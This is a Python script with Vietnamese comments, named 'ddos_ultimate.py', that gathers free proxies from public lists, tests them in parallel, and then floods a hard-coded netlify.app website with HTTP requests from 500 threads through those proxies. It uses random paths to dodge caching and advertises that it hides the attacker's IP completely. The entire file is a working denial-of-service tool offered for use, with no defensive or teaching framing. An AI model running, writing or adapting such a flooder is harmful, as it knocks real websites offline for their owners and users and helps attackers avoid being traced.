#!/usr/bin/env python3
# ddos_ultimate.py - Tích hợp proxy generator + DDOS, ẩn IP, tốc độ tối đa
# Sử dụng: python3 ddos_ultimate.py

import threading
import queue
import random
import time
import sys
import requests
import os
from urllib.parse import urlparse

# ==================== CẤU HÌNH ====================
TARGET_URL = "https://whstudio.netlify.app"   # Mục tiêu (sửa tại đây)
THREADS_PROXY_CHECK = 200      # Số luồng kiểm tra proxy
THREADS_DDOS = 500             # Số luồng tấn công
DURATION_DDOS = 60             # Giây tấn công
PROXY_TIMEOUT = 4              # Timeout kiểm tra proxy
DDOS_TIMEOUT = 2               # Timeout mỗi request DDOS
PROXY_TEST_URL = "http://httpbin.org/ip"   # URL kiểm tra proxy
MAX_PROXIES_TO_USE = 300       # Giới hạn proxy dùng để tránh quá tải
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Nguồn proxy (đã kiểm tra hoạt động)
PROXY_SOURCES = [
    "https://free-proxy-list.net/",
    "https://www.sslproxies.org/",
    "https://www.us-proxy.org/",
    "https://www.socks-proxy.net/",
    "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/http/data.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt"
]

# ==================== HÀM THU THẬP PROXY ====================
def fetch_proxies_from_url(url):
    proxies = set()
    try:
        headers = {"User-Agent": USER_AGENT}
        resp = requests.get(url, headers=headers, timeout=10)
        resp.raise_for_status()
        for line in resp.text.splitlines():
            line = line.strip()
            if ":" in line and line.count(":") == 1:
                ip, port = line.split(":")
                if ip.replace(".", "").isdigit() and port.isdigit():
                    proxies.add(f"{ip}:{port}")
    except:
        pass
    return proxies

def collect_proxies():
    all_proxies = set()
    print("[*] Đang thu thập proxy từ các nguồn...")
    for url in PROXY_SOURCES:
        proxies = fetch_proxies_from_url(url)
        all_proxies.update(proxies)
        domain = url.split("/")[2] if "//" in url else url[:30]
        print(f"    {domain}: {len(proxies)} proxy")
    print(f"[+] Tổng proxy thô: {len(all_proxies)}")
    return list(all_proxies)

# ==================== KIỂM TRA PROXY ====================
def check_proxy(proxy):
    proxy_dict = {"http": f"http://{proxy}", "https": f"https://{proxy}"}
    try:
        start = time.time()
        r = requests.get(PROXY_TEST_URL, proxies=proxy_dict, timeout=PROXY_TIMEOUT, headers={"User-Agent": USER_AGENT})
        if r.status_code == 200:
            latency = round(time.time() - start, 3)
            return (proxy, latency)
    except:
        pass
    return None

def worker_check(q, results, lock, stop_event):
    while not stop_event.is_set():
        try:
            proxy = q.get(timeout=0.3)
        except queue.Empty:
            break
        res = check_proxy(proxy)
        if res:
            with lock:
                results.append(res)
        q.task_done()

def filter_working_proxies(proxy_list):
    print(f"[*] Kiểm tra {len(proxy_list)} proxy với {THREADS_PROXY_CHECK} luồng...")
    q = queue.Queue()
    for p in proxy_list:
        q.put(p)
    
    results = []
    lock = threading.Lock()
    stop_event = threading.Event()
    threads = []
    for _ in range(min(THREADS_PROXY_CHECK, len(proxy_list))):
        t = threading.Thread(target=worker_check, args=(q, results, lock, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
    
    q.join()
    stop_event.set()
    for t in threads:
        t.join(timeout=1)
    
    results.sort(key=lambda x: x[1])  # Sắp xếp theo độ trễ
    print(f"[+] Số proxy hoạt động: {len(results)}")
    if not results:
        print("[-] Không có proxy nào hoạt động. Thoát.")
        sys.exit(1)
    
    # Giới hạn số lượng proxy dùng để tấn công (lấy nhanh nhất)
    if len(results) > MAX_PROXIES_TO_USE:
        results = results[:MAX_PROXIES_TO_USE]
        print(f"[+] Giới hạn còn {MAX_PROXIES_TO_USE} proxy nhanh nhất.")
    
    # Lưu danh sách proxy để dùng
    with open("active_proxies.txt", "w") as f:
        for proxy, lat in results:
            f.write(f"{proxy}\n")
    return [proxy for proxy, lat in results]

# ==================== TẤN CÔNG DDOS QUA PROXY ====================
class DDoSProxy:
    def __init__(self, proxy_list, target_url, threads, duration, timeout):
        self.proxy_list = proxy_list
        self.target_url = target_url.rstrip('/')
        self.threads = threads
        self.duration = duration
        self.timeout = timeout
        self.running = True
        self.total_requests = 0
        self.failed_requests = 0
        self.stats_lock = threading.Lock()
        self.proxy_lock = threading.Lock()
        
    def get_random_proxy(self):
        with self.proxy_lock:
            return random.choice(self.proxy_list)
    
    def attack_worker(self):
        session = requests.Session()
        session.headers.update({"User-Agent": USER_AGENT})
        while self.running:
            proxy_str = self.get_random_proxy()
            proxies = {"http": f"http://{proxy_str}", "https": f"https://{proxy_str}"}
            try:
                random_path = f"/{random.randint(1,999999)}?t={int(time.time()*1000)}"
                url = self.target_url + random_path
                # Gửi request, không cần response body để tiết kiệm băng thông
                resp = session.get(url, proxies=proxies, timeout=self.timeout, allow_redirects=False, stream=True)
                resp.close()
                with self.stats_lock:
                    self.total_requests += 1
            except Exception:
                with self.stats_lock:
                    self.failed_requests += 1
    
    def stats_display(self):
        start = time.time()
        last_total = 0
        print("\n" + "="*65)
        print(f"🔥 TẤN CÔNG DDOS QUA PROXY - ẨN IP HOÀN TOÀN")
        print(f"🎯 Mục tiêu: {self.target_url}")
        print(f"🔢 Proxy sẵn sàng: {len(self.proxy_list)} | 🧵 Luồng: {self.threads} | ⏱ Thời gian: {self.duration}s")
        print("="*65)
        print(f"{'Thời gian':<10} | {'Tổng req':<10} | {'Req/s':<8} | {'Thất bại':<10} | {'Tỉ lệ OK':<10}")
        print("-"*65)
        while self.running:
            time.sleep(1)
            elapsed = int(time.time() - start)
            with self.stats_lock:
                curr_total = self.total_requests
                curr_fail = self.failed_requests
            rate = curr_total - last_total
            last_total = curr_total
            success_rate = (curr_total / (curr_total + curr_fail + 0.001)) * 100
            print(f"{elapsed:<5}s     | {curr_total:<10} | {rate:<8} | {curr_fail:<10} | {success_rate:<6.1f}%")
            if elapsed >= self.duration:
                self.running = False
                break
        print("-"*65)
        print(f"✅ KẾT THÚC | Tổng request: {self.total_requests} | Thất bại: {self.failed_requests} | Thành công: {(self.total_requests/(self.total_requests+self.failed_requests+0.001))*100:.1f}%")
    
    def start(self):
        # Khởi tạo luồng tấn công
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        # Hiển thị thống kê
        self.stats_display()
        # Đợi luồng kết thúc
        for t in threads:
            t.join(timeout=0.2)
        print("[+] Kết thúc tấn công.")

# ==================== HÀM CHÍNH ====================
def main():
    print("\n" + "="*65)
    print("🚀 DDOS ULTIMATE - TÍCH HỢP PROXY + TẤN CÔNG")
    print("="*65)
    
    # Bước 1: Thu thập và kiểm tra proxy
    raw_proxies = collect_proxies()
    if not raw_proxies:
        print("[-] Không lấy được proxy từ các nguồn. Kiểm tra mạng.")
        sys.exit(1)
    
    working_proxies = filter_working_proxies(raw_proxies)
    if not working_proxies:
        print("[-] Không có proxy hoạt động. Thoát.")
        sys.exit(1)
    
    # Bước 2: Tấn công DDOS
    print(f"\n[*] Bắt đầu tấn công {TARGET_URL} với {len(working_proxies)} proxy...")
    ddos = DDoSProxy(working_proxies, TARGET_URL, THREADS_DDOS, DURATION_DDOS, DDOS_TIMEOUT)
    ddos.start()
    
    print("\n[+] Hoàn tất toàn bộ quá trình.")

if __name__ == "__main__":
    # Kiểm tra thư viện requests
    try:
        import requests
    except ImportError:
        print("[-] Cài đặt requests: pip install requests")
        sys.exit(1)
    main()
